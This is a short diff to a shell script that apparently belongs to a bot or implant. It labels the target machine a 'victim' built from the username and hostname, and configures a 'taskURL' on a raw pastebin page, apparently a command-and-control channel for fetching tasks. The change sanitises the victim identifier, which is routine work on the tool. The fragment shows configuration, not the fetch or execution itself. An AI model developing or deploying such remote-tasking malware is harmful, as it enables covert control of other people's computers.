@@ -8,6 +8,8 @@ if [ -z "$victim" ]; then
   victim="$USER.`hostname`"
 fi
 
+victim="`echo $victim | tr '.#[]/$' '______'`"
+
 ###################################################################
  # Configuration variables
 taskURL="https://pastebin.com/raw/PPUdAf1s"
